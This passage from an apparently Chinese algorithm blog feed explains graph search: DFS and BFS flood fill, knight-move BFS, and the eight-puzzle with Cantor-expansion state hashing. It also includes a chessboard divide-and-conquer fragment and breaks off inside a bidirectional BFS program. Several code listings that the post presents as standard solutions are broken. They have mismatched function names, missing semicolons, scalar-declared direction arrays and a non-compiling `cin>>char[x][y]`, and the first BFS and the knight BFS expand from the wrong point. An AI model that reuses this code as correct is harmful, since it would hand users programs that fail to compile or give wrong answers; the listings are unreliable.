<span class="comment">//分割棋盘</span></span><br><span class="line">    <span class="type">int</span> midx = c+s<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> midy = r+s<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 左下</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;=midx &amp;&amp; y&lt;=midy)&#123;</span><br><span class="line">        <span class="comment">// 如果存在特殊方格就继续分治</span></span><br><span class="line">        <span class="built_in">chessboard</span>(c,r,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 否则将三角形覆盖的那个方格当做特殊方格继续分治</span></span><br><span class="line">        board[midx][midy] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r,midx,midy,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 右下</span></span><br><span class="line">    <span class="keyword">if</span>(x&gt;midx &amp;&amp; y&lt;=midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx+<span class="number">1</span>][midy] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r,midx+<span class="number">1</span>,midy,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//左上</span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;=midx &amp;&amp; y&gt;midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r+s,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx][midy+<span class="number">1</span>] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c,r+s,midx,midy+<span class="number">1</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//右上</span></span><br><span class="line">    <span class="keyword">if</span>(x&gt;midx &amp;&amp; y&gt;midy)&#123;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r+s,x,y,s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        board[midx+<span class="number">1</span>][midy+<span class="number">1</span>] = cnt;</span><br><span class="line">        <span class="built_in">chessboard</span>(c+s,r+s,midx+<span class="number">1</span>,midy+<span class="number">1</span>,s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> k,x,y;</span><br><span class="line">    cin&gt;&gt;k&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    board[x][y] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 用 1&lt;&lt;k 获取棋盘分治的个数 2 的 k 次方</span></span><br><span class="line">    <span class="built_in">chessBoard</span>(<span class="number">1</span>, <span class="number">1</span>, x, y, (<span class="number">1</span>&lt;&lt;k));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=(<span class="number">1</span>&lt;&lt;k);i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=(<span class="number">1</span>&lt;&lt;k);j++)&#123;</span><br><span class="line">            cout&lt;&lt;board[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>分治</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】搜索技术</title>
    <url>/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="【算法】搜索技术"><a href="#【算法】搜索技术" class="headerlink" title="【算法】搜索技术"></a>【算法】搜索技术</h1><p>大部分搜索技术都是基于图进行搜索的，这里先列出几种图的简单表示方式</p>
<ul>
<li>邻接链表</li>
</ul>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image.png"></p>
<ul>
<li>邻接矩阵</li>
</ul>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-1.png"></p>
<h2 id="暴力搜索"><a href="#暴力搜索" class="headerlink" title="暴力搜索"></a>暴力搜索</h2><p>搜索过程有两种常见的基础策略，分别是 <strong>DFS（深度优先搜索）和 BFS（广度优先搜索）</strong></p>
<p>对于 DFS，深度优先，具体代码实现就要使用栈来实现，每次加入路径时，实现先进后出。对于 BFS，具体代码实现就要使用队列，先进先出的访问路径。</p>
<p>给一道例题，提供 BFS 和 DFS 的标程</p>
<h3 id="标程例题"><a href="#标程例题" class="headerlink" title="标程例题"></a>标程例题</h3><p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-2.png"></p>
<p>很简单的搜索题，这里没有卡时间空间，暴力搜索就可以了，具体代码实现时可以定义一个<strong>方向数组</strong>来方便搜索。</p>
<p>代码( BFS 和 DFS 的都在一起)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;</span><br><span class="line">    &#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> Wx,Hy,num;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> room[<span class="number">23</span>][<span class="number">23</span>]</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x&lt;Wx &amp;&amp; y&lt;Hy &amp;&amp; x&gt;=<span class="number">0</span> &amp;&amp; y&gt;=<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> dx,<span class="type">int</span> dy)</span></span>&#123;</span><br><span class="line">    num = <span class="number">1</span>;</span><br><span class="line">    node start,next;</span><br><span class="line">    queue&lt;node&gt; q;</span><br><span class="line">    start.x = dx;</span><br><span class="line">    start.y = dy;</span><br><span class="line">    q.<span class="built_in">push</span>(start);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        start = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> x = dx+dir[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = dx+dir[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">check</span>(x,y)||room[x][y]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                next.x = x;</span><br><span class="line">                next.y = y;</span><br><span class="line">                q.<span class="built_in">push</span>(next);</span><br><span class="line">                room[x][y]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> dx,<span class="type">int</span> dy)</span></span>&#123;</span><br><span class="line">    num = <span class="number">1</span>;</span><br><span class="line">    node start,next;</span><br><span class="line">    start.x = dx;</span><br><span class="line">    start.y = dy;</span><br><span class="line">    stack&lt;node&gt; st;</span><br><span class="line">    st.<span class="built_in">push</span>(start);</span><br><span class="line">    <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        start = st.<span class="built_in">top</span>();</span><br><span class="line">        st.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> x = start.x + dir[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y = start.y + dir[i][<span class="number">1</span>];</span><br><span class="line">            next.x = x;</span><br><span class="line">            next.y = y;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">check</span>(x,y)&amp;&amp;room[x][y]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                st.<span class="built_in">push</span>(next);</span><br><span class="line">                num++;</span><br><span class="line">                room[x][y]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> dx,dy;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;Wx&gt;&gt;Hy)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Wx==<span class="number">0</span>||Hy==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> y=<span class="number">0</span>;y&lt;Hy;y++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> x=<span class="number">0</span>;x&lt;Wx;x++)&#123;</span><br><span class="line">                cin&gt;&gt;<span class="type">char</span>[x][y];</span><br><span class="line">                <span class="keyword">if</span>(<span class="type">char</span>[x][y] == <span class="string">&#x27;@&#x27;</span>)&#123;</span><br><span class="line">                    dx = x;</span><br><span class="line">                    dy = y;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">bfs</span>(); <span class="comment">//或者 dfs</span></span><br><span class="line">        cout&lt;&lt;num&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="非标准搜索"><a href="#非标准搜索" class="headerlink" title="非标准搜索"></a>非标准搜索</h3><p>有时搜索会碰到一些比较奇怪的走法，例题</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-3.png"></p>
<p>这道题因为要记录所有点的最少步数，要用 BFS 去记录（要先进先出才能确保是最少的），然后因为是日子型走，所以方向数组有 8 种情况。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> map[<span class="number">410</span>][<span class="number">410</span>];</span><br><span class="line"><span class="type">bool</span> vis[<span class="number">410</span>][<span class="number">410</span>];</span><br><span class="line"><span class="type">int</span> ans[<span class="number">410</span>][<span class="number">410</span>];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> dx=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-2</span>&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> xx,<span class="type">int</span> yy):<span class="built_in">x</span>(xx),<span class="built_in">y</span>(yy)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">queue&lt;Point&gt; que;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x&lt;n&amp;&amp;x&gt;<span class="number">1</span>&amp;&amp;y&lt;m&amp;&amp;y&gt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    vis[x][y]=<span class="literal">true</span>;</span><br><span class="line">    que.<span class="built_in">push</span>(<span class="built_in">Point</span>(x,y));</span><br><span class="line">    <span class="keyword">while</span>(!que.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        Point top = que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        sum = ans[top.x][top.y] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> nx = x + dx[i];</span><br><span class="line">            <span class="type">int</span> ny = y + dy[i];</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">check</span>(nx,ny)&amp;&amp;!vis[nx][ny])&#123;</span><br><span class="line">                vis[nx][ny]=<span class="literal">true</span>;</span><br><span class="line">                que.<span class="built_in">push</span>(<span class="built_in">Point</span>(nx,ny));</span><br><span class="line">                ans[nx][ny] = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y,n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">-1</span>,<span class="built_in">sizeof</span>(ans));</span><br><span class="line">    <span class="built_in">bfs</span>(x,y);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            cout&lt;&lt;ans[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要注意的是 <code>memset</code>， <code>memset</code> 是不能乱用的，通常只有以下几种赋值方式：</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-4.png"></p>
<h2 id="搜索进阶"><a href="#搜索进阶" class="headerlink" title="搜索进阶"></a>搜索进阶</h2><h3 id="搜索状态优化"><a href="#搜索状态优化" class="headerlink" title="搜索状态优化"></a>搜索状态优化</h3><p>先给一道例题：</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-5.png"></p>
<p>看似是一个很简单的搜索，但其实别有洞天，注意这里的卡常(HDU)，无论是内存还是时间都卡的很死，对于八数码问题，我们将棋盘展开成一维数组 <code>012345678</code> ，其中 <code>0</code> 代表空格，然后我们将每次移动后产生的数组存入队列或者栈中实现 <code>BFS</code> 或者 <code>DFS</code> 来进行搜索，如果不做任何优化，复杂度就是指数级别</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-6.png"></p>
<p>这里可以先做一个剪枝，因为有些状态是重复了的，可以用 STL 容器 <code>set</code> 来进行去重，但是去重后还是会 TLE，因为<code>set</code> 容器内部是由红黑树实现的，他的插入复杂度都是$O(logn)$ 。</p>
<p>再去思考能否使用哈希去实现，哈希实现映射的复杂度是$O(1)$，但是在计算哈希值的时候，复杂度是$O(m)$，$m$ 为字符串长度，直接使用哈希还是会超时的，无论是自定义的哈希还是 <code>unordered_set</code>容器</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-7.png"></p>
<p>解决方案是使用<strong>打表法</strong>，先提前把所有映射值给打出来，就节约了先前构建映射的计算过程，但是除了时间复杂度，这道题还是会考空间复杂度，让我们对哈希的空间复杂度再做分析。</p>
<p>一共 9 个字符串，总共 $9!&#x3D;362880$ 种状态，存取这么多个 int 数组需要</p>
<p>$$ 362880 \times 4&#x2F;1024&#x2F;1024 \approx 1.38M $$</p>
<p>但是这是完全没有碎片情况下的存取空间（完全连续），哈希值的计算并不是连续的，他有很大的随机性，题目给的空间限制大约为 $30M$，差值为 $30$ 倍的容错值不保证能够通过所有案例，这里使用一种康托展开，来获取完全连续的存取空间。</p>
<p>康托展开通过获取全排列的方式，连续填充数组，如下表，康托值代表第几小的排列</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-8.png"></p>
<p>康托展开的计算通式为</p>
<p>$$ f(\sigma) &#x3D; \sum_{i&#x3D;1}^{n} a_i \cdot (n-i)! $$</p>
<p>其中：</p>
<ul>
<li>$\sigma$ 是一个长度为 $n$ 的排列。</li>
<li>$a_i$ 是在 $\sigma$ 的第 $i$ 个位置上的数字右边比它小的数字的个数。</li>
</ul>
<p>如：计算 2143 在 {1,2,3,4} 的康托值</p>
<p>$$Cantor&#x3D;1 \times 3!+0 \times 2!+1 \times 1! + 0&#x3D;7$$</p>
<p>在这道题中，使用康托展开来存取映射关系，就可以保证是一个完全连续的内存空间进行存取，空间占用率能够达到 $1.38M$。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">string d = <span class="string">&quot;durl&quot;</span>;</span><br><span class="line"><span class="comment">//节点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    string state;</span><br><span class="line">    <span class="type">int</span> cantor;</span><br><span class="line">    <span class="type">int</span> pos;</span><br><span class="line">    <span class="built_in">node</span>(string ss,<span class="type">int</span> cc,<span class="type">int</span> pp)&#123;</span><br><span class="line">        state=ss;cantor=cc;pos=pp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//用来记录路径的</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">path</span>&#123;</span><br><span class="line">    <span class="type">int</span> from; <span class="comment">//上一个状态的cantor 值</span></span><br><span class="line">    <span class="type">char</span> dir; <span class="comment">//上一个状态过来的方向</span></span><br><span class="line">&#125;pa[<span class="number">362888</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//用来判断边界</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">legal</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=<span class="number">0</span>&amp;&amp;x&lt;=<span class="number">2</span>&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;y&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> visited[<span class="number">362888</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//把阶乘的结果打表</span></span><br><span class="line"><span class="type">int</span> factory[]=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">24</span>,<span class="number">120</span>,<span class="number">720</span>,<span class="number">5040</span>,<span class="number">40320</span>,<span class="number">362880</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getContor</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;<span class="number">9</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i]&gt;str[j])&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res += cnt*factory[<span class="number">9</span>-i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(string init)</span></span>&#123;</span><br><span class="line">    queue&lt;node&gt; q;</span><br><span class="line">    <span class="type">int</span> num = <span class="built_in">getContor</span>(init);</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="built_in">node</span>(init,num,<span class="number">8</span>));</span><br><span class="line">    visited[num]=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 终止条件</span></span><br><span class="line">    pa[num].from=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node top = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// 计算 x 点的x,y 坐标</span></span><br><span class="line">        <span class="type">int</span> x = top.pos/<span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> y = top.pos%<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">int</span> xx = x + dir[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> yy = y + dir[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">legal</span>(xx,yy))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">int</span> new_pos = xx*<span class="number">3</span> + yy;</span><br><span class="line">            string next_state = top.state;</span><br><span class="line">            <span class="built_in">swap</span>(next_state[top.pos],next_state[new_pos]);</span><br><span class="line">            num = <span class="built_in">getContor</span>(next_state);</span><br><span class="line">            <span class="keyword">if</span>(visited[num])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(<span class="built_in">node</span>(next_state,num,new_pos));</span><br><span class="line">            visited[num]=<span class="number">1</span>;</span><br><span class="line">            pa[num].from = top.cantor;</span><br><span class="line">            pa[num].dir = d[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//打表提前计算映射</span></span><br><span class="line">    <span class="built_in">bfs</span>(<span class="string">&quot;12345678x&quot;</span>);</span><br><span class="line">    string tmp;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">getline</span>(cin,tmp))&#123;</span><br><span class="line">        string puzzle;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tmp.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="comment">//注意过滤空格</span></span><br><span class="line">            <span class="keyword">if</span>(tmp[i]!=<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                puzzle.<span class="built_in">push_back</span>(tmp[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> num = <span class="built_in">getContor</span>(puzzle);</span><br><span class="line">        <span class="keyword">if</span>(visited[num]==<span class="number">0</span>)&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;unsolvable&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pa[num].from==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;pa[num].dir;</span><br><span class="line">            num = pa[num].from;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双向bfs"><a href="#双向bfs" class="headerlink" title="双向bfs"></a>双向bfs</h3><p>双向 bfs 顾名思义就是分别从开头和结尾进行两个方向的 bfs，当出现交集的时候，停止 bfs，代表找到路径。bfs 循环在两个队列都为非空的时候才会进行。</p>
<p>为了避免双向 bfs 退化成单向 bfs，要引入一些搜索策略，每次选择元素较少的队列进行 bfs，交替逐层搜索。</p>
<p>例题</p>
<p><img src="/2023/12/25/%E7%AE%97%E6%B3%95-%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/image-9.png"></p>
<p>双向 bfs 标程，直接给代码吧</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; P;</span><br><span class="line"><span class="type">int</span> r,c,ans;</span><br><span class="line">queue&lt;P&gt; q1,q2;</span><br><span class="line"><span class="type">int</span> dis[<span class="number">45</span>][<span class="number">45</span>],vst[<span class="number">45</span>][<span class="number">45</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//dis 记录走了多少步，vst 记录是谁访问这个节点</span></span><br><span class="line"><span class="type">int</span> dx = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">char</span> m[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dbfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    q1.<span class="built_in">push</span>(<span class="built_in">P</span>(<span class="number">1</span>,<span class="number">1</span>)), dis[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>, vst[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    q2.<span class="built_in">push</span>(<span class="built_in">P</span>(r,c)), dis[r][c]=<span class="number">1</span>, vst[r][c]=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q1.<span class="built_in">empty</span>()&amp;&amp;!q2.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="type">int</span> x0,y0;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">size</span>()&gt;q2.<span 